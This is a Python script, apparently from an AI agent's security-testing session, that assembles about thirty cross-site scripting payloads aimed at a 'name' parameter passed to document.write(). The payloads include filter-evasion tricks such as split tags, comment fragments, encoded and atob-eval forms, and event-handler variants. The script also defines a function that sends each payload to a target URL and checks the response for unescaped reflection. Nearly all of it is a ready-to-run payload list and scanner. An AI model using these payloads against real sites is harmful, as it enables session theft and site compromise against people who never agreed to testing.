import requests
import urllib.parse
import re
import time

print("="*80)
print("XSS DOCUMENT.WRITE() DISCOVERY & TESTING")
print("="*80)

# Since we don't have a specific target URL from context,
# we need to use a placeholder and show the testing methodology
# The context mentions testing 'name' parameter flow to document.write()

# Let's create the XSS test payloads properly this time
xss_payloads = {}

# Basic payloads
xss_payloads['basic_script'] = '<script>alert(document.domain)</script>'
xss_payloads['basic_img'] = '<img src=x onerror=alert(document.domain)>'
xss_payloads['basic_svg'] = '<svg onload=alert(document.domain)>'
xss_payloads['basic_body'] = '<body onload=alert(document.domain)>'

# Case variations
xss_payloads['mixed_case'] = '<ScRiPt>alert(document.domain)</ScRiPt>'
xss_payloads['upper_case'] = '<SCRIPT>alert(document.domain)</SCRIPT>'

# Encoding variations
xss_payloads['url_encoded'] = '%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
xss_payloads['html_entities'] = '&#60;script&#62;alert(document.domain)&#60;&#47;script&#62;'
xss_payloads['hex_entities'] = '&#x3C;script&#x3E;alert(document.domain)&#x3C;&#x2F;script&#x3E;'

# Filter bypass techniques
xss_payloads['tag_blacklist'] = '<scr<script>ipt>alert(document.domain)</scr</script>ipt>'
xss_payloads['space_alt'] = '<img/src=x/onerror=alert(document.domain)>'
xss_payloads['fragment_comment'] = '<scr<!--test-->ipt>alert(document.domain)</scr<!--test-->ipt>'
xss_payloads['eval_fromcharcode'] = '<script>alert(String.fromCharCode(88,83,83))</script>'

# Advanced techniques
xss_payloads['template_literal'] = '<img src=x onerror=alert`test`>'
xss_payloads['no_parenthesis'] = '<img src=x onerror=alert;throw 1337>'
xss_payloads['unicode_encode'] = '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(document.domain)</script>'
xss_payloads['atob_eval'] = '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>'
xss_payloads['fromcharcode_function'] = '<script>Function(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>'

# Event handler variations
xss_payloads['details_toggle'] = '<details open ontoggle=alert(document.domain)>'
xss_payloads['autofocus_input'] = '<input autofocus onfocus=alert(document.domain)>'
xss_payloads['video_error'] = '<video><source onerror=alert(document.domain)>'
xss_payloads['body_event'] = '<body onload=alert(document.domain)>'
xss_payloads['iframe_srcdoc'] = '<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>'
xss_payloads['object_data'] = '<object data="data:text/html,<script>alert(document.domain)</script>"></object>'
xss_payloads['embed_src'] = '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+">'
xss_payloads['form_action'] = '<form action="javascript:alert(document.domain)"><input type=submit>'
xss_payloads['button_formaction'] = '<button formaction=javascript:alert(document.domain)>Click</button>'

print(f'[+] Prepared XSS test payloads: {len(xss_payloads)}')
print('[+] Target parameter: name')
print('[+] Testing method: document.write() reflection')

# Show first few payloads
print('\n[+] Sample payloads:')
count = 0
for name, payload in xss_payloads.items():
    if count < 5:
        print(f'    {count+1}. {name}: {payload[:60]}...')
        count += 1

# Create a test function
def test_xss_payload(url, param_name, payload, method='GET'):
    """Test XSS payload against target URL"""
    try:
        if method.upper() == 'GET':
            params = {param_name: payload}
            response = requests.get(url, params=params, timeout=10)
        else:
            data = {param_name: payload}
            response = requests.post(url, data=data, timeout=10)
        
        # Analyze response for XSS indicators
        indicators = {
            'script_tag': '<script>' in response.text and '&lt;script&gt;' not in response.text,
            'event_handler': bool(re.search(r'on\w+\s*=\s*[\'"]?alert', response.text, re.I)),
            'javascript_proto': bool(re.search(r'javascript:alert', response.text, re.I)),
            'svg_onload': bool(re.search(r'<svg[^>]*onload', response.text, re.I)),
            'payload_reflected': payload in response.text,
            'html_encoded': '&lt;' in response.text and payload.replace('<', '&lt;') in response.text
        }
        
        return {
            'payload': payload,
            'status_code': response.status_code,
            'content_length': len(response.content),
            'indicators': indicators
        }
    except Exception as e:
        return {'error': str(e), 'payload': payload}

